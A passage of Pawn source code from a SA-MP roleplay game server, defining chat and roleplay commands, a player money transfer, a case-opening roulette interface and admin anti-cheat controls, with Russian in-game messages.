	if(PlayerInfo[playerid][pCash] == 0) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
 	if(params[1] < 1 || params[1] > 10000) return SendClientMessage(playerid,CGREY,"Минимальная переданная сумма - 1. Максимальная - 10000");
	if(PlayerInfo[playerid][pCash] < params[1]) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
 	new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	GiveMoney(playerid, -params[1]);
	GiveMoney(params[0],params[1]);
	static const fmt_string[] = "%s достал $%i и передал их %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+5];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[1],PlayerInfo[params[0]][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	SetPlayerChatBubble(playerid, "достал деньги передал их", COLOR_PURPLE, 30.0, 7000);
	return true;
}
CMD:w(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /w [текст]");
	if(PlayerInfo[playerid][pMuted] > 0)
	{
		SetPlayerChatBubble(playerid,"Что-то промычал",CREWARD,20.0,1000);
		static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	static const fmt_str[] = "{D6ECCB} - %s[%d] шепчет: %s";
	new string[sizeof(fmt_str)+10+MAX_PLAYER_NAME+4+128];
	format(string, sizeof(string), fmt_str,PlayerInfo[playerid][pSendername], playerid,params[0]);
	ProxDetector(3.0, playerid, string,CFADE1);
	if(strfind(params[0],"/pay",true) != -1 || strfind(params[0],".ru",true) != -1 || strfind(params[0],".com",true) != -1 || strfind(params[0],".su",true) != -1 || strfind(params[0],":7777",true) != -1 )
	{
	    static const fmt_string1[] = "[A] Warning: %s[%d] (/w): %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+64];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,params[0]);
		SendAdminMessage(CLIGHTRED,str1);
	}
	return true;
}
CMD:s(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /s [текст]");
	if(PlayerInfo[playerid][pMuted] > 0)
	{
		SetPlayerChatBubble(playerid,"Что-то промычал",CREWARD,20.0,1000);
		static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	static const fmt_str[] = "{%06x} - %s[%d]{FFFFFF} кричит: %s";
	new string[sizeof(fmt_str)+10+MAX_PLAYER_NAME+4+128];
	format(string, sizeof(string), fmt_str, GetPlayerColor(playerid) >>> 8,PlayerInfo[playerid][pSendername], playerid,params[0]);
	ProxDetector(50.0, playerid, string,CFADE1);
	SetPlayerChatBubble(playerid,params[0],CREWARD,26.0,10000);
	if(GetPVarInt(playerid,"AntiSbiv") == 0)
	{
	    if(GetPVarInt(playerid,"TimerRaz") > 0) KillTimer(GetPVarInt(playerid,"TimerRaz")),DeletePVar(playerid,"TimerRaz");
  		if(strlen(params[0]) < 16)
	    {
			ApplyAnimation(playerid, "ON_LOOKERS", "SHOUT_01",4.1,0,1,1,1,1,1);
			new kek = SetTimerEx("ClearAnim", 130*15, 0, "d", playerid);
			SetPVarInt(playerid,"TimerRaz",kek);
		}
		else
		{
		    ApplyAnimation(playerid, "ON_LOOKERS", "SHOUT_01",4.1,0,1,1,1,1,1);
			new kek = SetTimerEx("ClearAnim", 130*strlen(params[0]), 0, "d", playerid);
			SetPVarInt(playerid,"TimerRaz",kek);
		}
	}
	if(strfind(params[0],"/pay",true) != -1 || strfind(params[0],".ru",true) != -1 || strfind(params[0],".com",true) != -1 || strfind(params[0],".su",true) != -1 || strfind(params[0],":7777",true) != -1 )
	{
	    static const fmt_string1[] = "[A] Warning: %s[%d] (/s): %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+64];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,params[0]);
		SendAdminMessage(CLIGHTRED,str1);
	}
	return true;
}
CMD:b(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /b [текст]");
	if(PlayerInfo[playerid][pMuted] > 0)
	{
		SetPlayerChatBubble(playerid,"Что-то промычал",CREWARD,20.0,1000);
		static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	static const fmt_str[] = "(( %s[%d]: %s ))";
	new string[sizeof(fmt_str)+MAX_PLAYER_NAME+4+100];
	format(string, sizeof(string), fmt_str,PlayerInfo[playerid][pSendername], playerid,params[0]);
	ProxDetector(20.0, playerid, string,CFADE1);
	return true;
}
//CMD:n(playerid,params[]) return cmd_b(playerid,params);
CMD:todo(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
 	if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(sscanf(params, "s[128]", params)) return SendClientMessage(playerid, CGREY, "Используйте /todo [Текст*Действие]");
	if(strfind(params,"/pay",true) != -1 || strfind(params,".ru",true) != -1 || strfind(params,".com",true) != -1 || strfind(params,".su",true) != -1 || strfind(params,":7777",true) != -1)
	{
	    static const fmt_string1[] = "[A] Warning: %s[%d] (/todo): %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+100];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,params[0]);
		SendAdminMessage(CLIGHTRED,str1);
	}
	if(strfind(params, "*") == -1) return SendClientMessage(playerid, CGREY, "Используйте /todo [Текст*Действие]");
	new arrCoords[2][128];
 	sscanf(params,"p<*>s[128]s[128]",arrCoords[0],arrCoords[1]);
	static const fmt_str21[] = "%s - {BD96FD}произнёс(-ла) %s %s";
	new string21[sizeof(fmt_str21)+MAX_PLAYER_NAME+4+128];
	format(string21, sizeof(string21), fmt_str21, arrCoords[0],PlayerInfo[playerid][pSendername],arrCoords[1]);
	ProxDetector(20.0, playerid, string21,CFADE1);
	SetPlayerChatBubble(playerid,string21,-1,20.0,10000);
	return 1;
}
CMD:me(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /me [действие]");
	if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(strfind(params[0],"/pay",true) != -1 || strfind(params[0],".ru",true) != -1 || strfind(params[0],".com",true) != -1 || strfind(params[0],".su",true) != -1 || strfind(params[0],":7777",true) != -1)
	{
	    static const fmt_string1[] = "[A] Warning: %s[%d] (/me): %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+100];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,params[0]);
		SendAdminMessage(CLIGHTRED,str1);
	}
	static const fmt_string[] = "%s %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
	if(strlen(params[0]) >= 80)
	{
		new string[128];//переменная для хранения перенесенного текста
		new mess[128];//переменная для форматирования и отправки п.т
		strmid(string,params[0],64,128,128);//запишем текст для переноса в переменную
		strdel(params[0],64,128);
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[0]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, params[0], COLOR_PURPLE, 30.0, 7000);
		format(mess, 88, "%s",string);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,string);
	}
	else
	{
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[0]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, params[0], COLOR_PURPLE, 30.0, 7000);
	}
	return true;
}
CMD:ame(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /ame [описание]");
	if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(strfind(params[0],"/pay",true) != -1 || strfind(params[0],".ru",true) != -1 || strfind(params[0],".com",true) != -1 || strfind(params[0],".su",true) != -1 || strfind(params[0],":7777",true) != -1)
	{
	    static const fmt_string1[] = "[A] Warning: %s[%d] (/ame): %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+100];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,params[0]);
		SendAdminMessage(CLIGHTRED,str1);
	}
	static const fmt_string[] = "%s %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[0]);
	SendClientMessage(playerid,COLOR_PURPLE,str);
	SetPlayerChatBubble(playerid, params[0], COLOR_PURPLE, 30.0, 7000);
	return true;
}
CMD:do(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /do [текст]");
	if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(strfind(params[0],"/pay",true) != -1 || strfind(params[0],".ru",true) != -1 || strfind(params[0],".com",true) != -1 || strfind(params[0],".su",true) != -1 || strfind(params[0],":7777",true) != -1 )
	{
	    static const fmt_string1[] = "[A] Warning: %s[%d] (/do): %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+100];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,params[0]);
		SendAdminMessage(CLIGHTRED,str1);
	}
	static const fmt_string[] = "%s {FFFFFF}(%s)";
	new str[sizeof(fmt_string)+100+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,params[0],PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	return true;
}
CMD:try(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /try [действие]");
	if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	new temptryrand = random(2);
	if(strfind(params[0],"/pay",true) != -1 || strfind(params[0],".ru",true) != -1 || strfind(params[0],".com",true) != -1 || strfind(params[0],".su",true) != -1 || strfind(params[0],":7777",true) != -1 )
	{
	    static const fmt_string1[] = "[A] Warning: %s[%d] (/try): %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+100];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,params[0]);
		SendAdminMessage(CLIGHTRED,str1);
	}
	if(temptryrand == 1)
	{
		static const fmt_string[] = "%s пытается %s {FFFFFF}(Удачно)";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[0]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	}
	else
	{
		static const fmt_string[] = "%s пытается %s {FFFFFF}(Неудачно)";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[0]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	}
	return true;
}
CMD:opencase(playerid)
{
	if(PlayerInfo[playerid][pPriz] == 0) return SendClientMessage(playerid,CGREY,"У вас нет кейса");
	if(GetPVarInt(playerid,"OpenCase")) return 1;
	
	Roulette[0] = TextDrawCreate(231.666656, 195.792617, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[0], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[0], 13.666666, 15.762963);
	TextDrawAlignment(Roulette[0], 1);
	TextDrawColor(Roulette[0], -36827905);
	TextDrawSetShadow(Roulette[0], 0);
	TextDrawSetOutline(Roulette[0], 0);
	TextDrawFont(Roulette[0], 4);

	Roulette[1] = TextDrawCreate(238.000000, 198.696289, "LD_SPAC:white"); // Texture element
	TextDrawLetterSize(Roulette[1], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[1], 142.333312, 10.785181);
	TextDrawAlignment(Roulette[1], 1);
	TextDrawColor(Roulette[1], 255);
	TextDrawSetShadow(Roulette[1], 0);
	TextDrawSetOutline(Roulette[1], 0);
	TextDrawFont(Roulette[1], 4);

	Roulette[2] = TextDrawCreate(372.999938, 195.792602, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[2], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[2], 13.666667, 15.762963);
	TextDrawAlignment(Roulette[2], 1);
	TextDrawColor(Roulette[2], 255);
	TextDrawSetShadow(Roulette[2], 0);
	TextDrawSetOutline(Roulette[2], 0);
	TextDrawFont(Roulette[2], 4);

	Roulette[3] = TextDrawCreate(234.000000, 203.674057, "LD_SPAC:white"); // Texture element
	TextDrawLetterSize(Roulette[3], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[3], 150.666656, 36.503726);
	TextDrawAlignment(Roulette[3], 1);
	TextDrawColor(Roulette[3], -36827905);
	TextDrawSetShadow(Roulette[3], 0);
	TextDrawSetOutline(Roulette[3], 0);
	TextDrawFont(Roulette[3], 4);

	Roulette[4] = TextDrawCreate(231.666656, 232.296340, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[4], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[4], 13.666666, 15.762963);
	TextDrawAlignment(Roulette[4], 1);
	TextDrawColor(Roulette[4], -36827905);
	TextDrawSetShadow(Roulette[4], 0);
	TextDrawSetOutline(Roulette[4], 0);
	TextDrawFont(Roulette[4], 4);

	Roulette[5] = TextDrawCreate(238.666687, 236.859298, "LD_SPAC:white"); // Texture element
	TextDrawLetterSize(Roulette[5], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[5], 140.999969, 8.711133);
	TextDrawAlignment(Roulette[5], 1);
	TextDrawColor(Roulette[5], 255);
	TextDrawSetShadow(Roulette[5], 0);
	TextDrawSetOutline(Roulette[5], 0);
	TextDrawFont(Roulette[5], 4);

	Roulette[6] = TextDrawCreate(373.166534, 232.211135, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[6], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[6], 13.666667, 15.762963);
	TextDrawAlignment(Roulette[6], 1);
	TextDrawColor(Roulette[6], 255);
	TextDrawSetShadow(Roulette[6], 0);
	TextDrawSetOutline(Roulette[6], 0);
	TextDrawFont(Roulette[6], 4);

	Roulette[7] = TextDrawCreate(232.666656, 195.792617, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[7], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[7], 13.666666, 15.762963);
	TextDrawAlignment(Roulette[7], 1);
	TextDrawColor(Roulette[7], 255);
	TextDrawSetShadow(Roulette[7], 0);
	TextDrawSetOutline(Roulette[7], 0);
	TextDrawFont(Roulette[7], 4);

	Roulette[8] = TextDrawCreate(235.000000, 203.674057, "LD_SPAC:white"); // Texture element
	TextDrawLetterSize(Roulette[8], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[8], 149.666641, 35.674098);
	TextDrawAlignment(Roulette[8], 1);
	TextDrawColor(Roulette[8], 255);
	TextDrawSetShadow(Roulette[8], 0);
	TextDrawSetOutline(Roulette[8], 0);
	TextDrawFont(Roulette[8], 4);

	Roulette[9] = TextDrawCreate(232.666656, 232.296340, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[9], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[9], 13.666666, 15.762963);
	TextDrawAlignment(Roulette[9], 1);
	TextDrawColor(Roulette[9], 255);
	TextDrawSetShadow(Roulette[9], 0);
	TextDrawSetOutline(Roulette[9], 0);
	TextDrawFont(Roulette[9], 4);

	Roulette[10] = TextDrawCreate(307.833343, 173.562957, "LD_SPAC:white"); // Texture element
	TextDrawLetterSize(Roulette[10], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[10], 2.999969, 99.555557);
	TextDrawAlignment(Roulette[10], 1);
	TextDrawColor(Roulette[10], -36827905);
	TextDrawSetShadow(Roulette[10], 0);
	TextDrawSetOutline(Roulette[10], 0);
	TextDrawFont(Roulette[10], 4);

	Roulette[11] = TextDrawCreate(307.166595, 170.329574, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[11], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[11], 4.333333, 6.222218);
	TextDrawAlignment(Roulette[11], 1);
	TextDrawColor(Roulette[11], -36827905);
	TextDrawSetShadow(Roulette[11], 0);
	TextDrawSetOutline(Roulette[11], 0);
	TextDrawFont(Roulette[11], 4);

	Roulette[12] = TextDrawCreate(307.166595, 270.714752, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[12], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[12], 4.333333, 6.222218);
	TextDrawAlignment(Roulette[12], 1);
	TextDrawColor(Roulette[12], -36827905);
	TextDrawSetShadow(Roulette[12], 0);
	TextDrawSetOutline(Roulette[12], 0);
	TextDrawFont(Roulette[12], 4);

	Roulette[13] = TextDrawCreate(401.333312, 210.810974, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[13], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[13], 17.000005, 20.740741);
	TextDrawAlignment(Roulette[13], 1);
	TextDrawColor(Roulette[13], -36827905);
	TextDrawSetShadow(Roulette[13], 0);
	TextDrawSetOutline(Roulette[13], 0);
	TextDrawFont(Roulette[13], 4);

	Roulette[14] = TextDrawCreate(410.333343, 214.459259, "LD_SPAC:white"); // Texture element
	TextDrawLetterSize(Roulette[14], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[14], 81.999961, 13.688881);
	TextDrawAlignment(Roulette[14], 1);
	TextDrawColor(Roulette[14], -36827905);
	TextDrawSetShadow(Roulette[14], 0);
	TextDrawSetOutline(Roulette[14], 0);
	TextDrawFont(Roulette[14], 4);

	Roulette[15] = TextDrawCreate(484.000030, 210.810943, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[15], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[15], 17.000005, 20.740739);
	TextDrawAlignment(Roulette[15], 1);
	TextDrawColor(Roulette[15], -36827905);
	TextDrawSetShadow(Roulette[15], 0);
	TextDrawSetOutline(Roulette[15], 0);
	TextDrawFont(Roulette[15], 4);

	Roulette[16] = TextDrawCreate(450.166748, 215.288848, "start_game"); // box press to start game (box click)
	TextDrawLetterSize(Roulette[16], 0.190999, 1.234963);
	TextDrawTextSize(Roulette[16], 10.000000, 100.000000);
	TextDrawAlignment(Roulette[16], 2);
	TextDrawColor(Roulette[16], -1);
	TextDrawUseBox(Roulette[16], true);
	TextDrawBoxColor(Roulette[16], 696307968);
	TextDrawSetShadow(Roulette[16], 0);
	TextDrawSetOutline(Roulette[16], 0);
	TextDrawBackgroundColor(Roulette[16], 51);
	TextDrawFont(Roulette[16], 2);
	TextDrawSetProportional(Roulette[16], 1);
	TextDrawSetSelectable(Roulette[16], true);

	Roulette[17] = TextDrawCreate(493.000000, 227.403503, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[17], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[17], 4.666674, 5.807403);
	TextDrawAlignment(Roulette[17], 1);
	TextDrawColor(Roulette[17], -36827905);
	TextDrawSetShadow(Roulette[17], 0);
	TextDrawSetOutline(Roulette[17], 0);
	TextDrawFont(Roulette[17], 4);

	Roulette[18] = TextDrawCreate(496.333312, 226.159057, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[18], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[18], 2.666671, 3.318514);
	TextDrawAlignment(Roulette[18], 1);
	TextDrawColor(Roulette[18], -36827905);
	TextDrawSetShadow(Roulette[18], 0);
	TextDrawSetOutline(Roulette[18], 0);
	TextDrawFont(Roulette[18], 4);

	Roulette[19] = TextDrawCreate(304.999938, 269.714630, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[19], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[19], 2.666671, 3.318514);
	TextDrawAlignment(Roulette[19], 1);
	TextDrawColor(Roulette[19], -36827905);
	TextDrawSetShadow(Roulette[19], 0);
	TextDrawSetOutline(Roulette[19], 0);
	TextDrawFont(Roulette[19], 4);

	Roulette[20] = TextDrawCreate(303.333251, 272.203521, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[20], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[20], 4.333340, 5.392588);
	TextDrawAlignment(Roulette[20], 1);
	TextDrawColor(Roulette[20], -36827905);
	TextDrawSetShadow(Roulette[20], 0);
	TextDrawSetOutline(Roulette[20], 0);
	TextDrawFont(Roulette[20], 4);

	Roulette[21] = TextDrawCreate(305.333251, 275.936859, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[21], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[21], 6.666673, 8.296291);
	TextDrawAlignment(Roulette[21], 1);
	TextDrawColor(Roulette[21], -36827905);
	TextDrawSetShadow(Roulette[21], 0);
	TextDrawSetOutline(Roulette[21], 0);
	TextDrawFont(Roulette[21], 4);

	Roulette[22] = TextDrawCreate(311.666534, 172.647994, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[22], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[22], 2.666671, 3.318514);
	TextDrawAlignment(Roulette[22], 1);
	TextDrawColor(Roulette[22], -36827905);
	TextDrawSetShadow(Roulette[22], 0);
	TextDrawSetOutline(Roulette[22], 0);
	TextDrawFont(Roulette[22], 4);

	Roulette[23] = TextDrawCreate(310.333251, 167.255371, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[23], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[23], 4.333340, 5.392588);
	TextDrawAlignment(Roulette[23], 1);
	TextDrawColor(Roulette[23], -36827905);
	TextDrawSetShadow(Roulette[23], 0);
	TextDrawSetOutline(Roulette[23], 0);
	TextDrawFont(Roulette[23], 4);

	Roulette[24] = TextDrawCreate(305.333343, 162.277603, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(Roulette[24], 0.000000, 0.000000);
	TextDrawTextSize(Roulette[24], 6.666673, 8.296291);
	TextDrawAlignment(Roulette[24], 1);
	TextDrawColor(Roulette[24], -36827905);
	TextDrawSetShadow(Roulette[24], 0);
	TextDrawSetOutline(Roulette[24], 0);
	TextDrawFont(Roulette[24], 4);



	RouletteP[0][playerid] = CreatePlayerTextDraw(playerid, 247.333343, 195.292556, "LD_SPAC:white"); // box prize 1
	PlayerTextDrawLetterSize(playerid, RouletteP[0][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, RouletteP[0][playerid], 40.666660, 50.607402);
	PlayerTextDrawAlignment(playerid, RouletteP[0][playerid], 1);
	PlayerTextDrawColor(playerid, RouletteP[0][playerid], -1);
	PlayerTextDrawUseBox(playerid, RouletteP[0][playerid], true);
	PlayerTextDrawBoxColor(playerid, RouletteP[0][playerid], -256);
	PlayerTextDrawSetShadow(playerid, RouletteP[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, RouletteP[0][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, RouletteP[0][playerid], -256);
	PlayerTextDrawFont(playerid, RouletteP[0][playerid], 5);
	PlayerTextDrawSetPreviewModel(playerid, RouletteP[0][playerid], 19804);
	PlayerTextDrawSetPreviewRot(playerid, RouletteP[0][playerid], 0.000000, 0.000000, 0.000000, 1.000000);

	RouletteP[1][playerid] = CreatePlayerTextDraw(playerid, 288.666595, 195.462921, "LD_SPAC:white"); // box prize 2
	PlayerTextDrawLetterSize(playerid, RouletteP[1][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, RouletteP[1][playerid], 40.666660, 50.607402);
	PlayerTextDrawAlignment(playerid, RouletteP[1][playerid], 1);
	PlayerTextDrawColor(playerid, RouletteP[1][playerid], -1);
	PlayerTextDrawUseBox(playerid, RouletteP[1][playerid], true);
	PlayerTextDrawBoxColor(playerid, RouletteP[1][playerid], -256);
	PlayerTextDrawSetShadow(playerid, RouletteP[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, RouletteP[1][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, RouletteP[1][playerid], -256);
	PlayerTextDrawFont(playerid, RouletteP[1][playerid], 5);
	PlayerTextDrawSetPreviewModel(playerid, RouletteP[1][playerid], 19804);
	PlayerTextDrawSetPreviewRot(playerid, RouletteP[1][playerid], 0.000000, 0.000000, 0.000000, 1.000000);

	RouletteP[2][playerid] = CreatePlayerTextDraw(playerid, 331.166656, 195.292587, "LD_SPAC:white"); // box prize 3
	PlayerTextDrawLetterSize(playerid, RouletteP[2][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, RouletteP[2][playerid], 40.666660, 50.607402);
	PlayerTextDrawAlignment(playerid, RouletteP[2][playerid], 1);
	PlayerTextDrawColor(playerid, RouletteP[2][playerid], -1);
	PlayerTextDrawUseBox(playerid, RouletteP[2][playerid], true);
	PlayerTextDrawBoxColor(playerid, RouletteP[2][playerid], -256);
	PlayerTextDrawSetShadow(playerid, RouletteP[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, RouletteP[2][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, RouletteP[2][playerid], -256);
	PlayerTextDrawFont(playerid, RouletteP[2][playerid], 5);
	PlayerTextDrawSetPreviewModel(playerid, RouletteP[2][playerid], 19804);
	PlayerTextDrawSetPreviewRot(playerid, RouletteP[2][playerid], 0.000000, 0.000000, 0.000000, 1.000000);
	
	for(new i = 0; i < 25; i++) TextDrawShowForPlayer(playerid,Roulette[i]);
	for(new i = 0; i < 3; i++) PlayerTextDrawShow(playerid,RouletteP[i][playerid]);


	SelectTextDraw(playerid, CGREY);
	
/*	PlayerInfo[playerid][pPriz] = 0;
 	PlayerTextDrawSetPreviewModel(playerid, OpenCase[playerid][0], 2);
    Case[0] = 2;
    PlayerTextDrawSetPreviewModel(playerid, OpenCase[playerid][1], 1212);
    Case[1] = 1212;
    PlayerTextDrawSetPreviewModel(playerid, OpenCase[playerid][2], 1274);
    Case[2] = 1274;
	for(new i = 0; i<= 6; i++) PlayerTextDrawShow(playerid,OpenCase[playerid][i]);
	new time = SetTimerEx("OpenCaseP",100,true,"i",playerid);
	SetPVarInt(playerid,"OCTimer",time);
	SetPVarInt(playerid,"OpenCase",1);
	SetPVarInt(playerid,"OCK",random(50-20)+20);
	TogglePlayerControllable(playerid, 0);*/
	return 1;
}

CMD:ach(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(FD1 || FD2)
	{
		new str[10+32+20+6];
		query = "";
		for(new i = 0; i < sizeof(cheatk); i++)
		{
			format(str,sizeof(str),"{ffffff}%s\t%s\n",NameCheat[i],(cheatk[i]) ? ("{F85A5A}[Выключен]"):("{20BA09}[Включен]"));
			strcat(query,str);
		}
		ShowPlayerDialog(playerid, 361, DIALOG_STYLE_TABLIST, "Анти-чит",query,"Далее","Назад");
	}
	
	return true;
}
CMD:givewarehouse(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(FD1 || FD2)
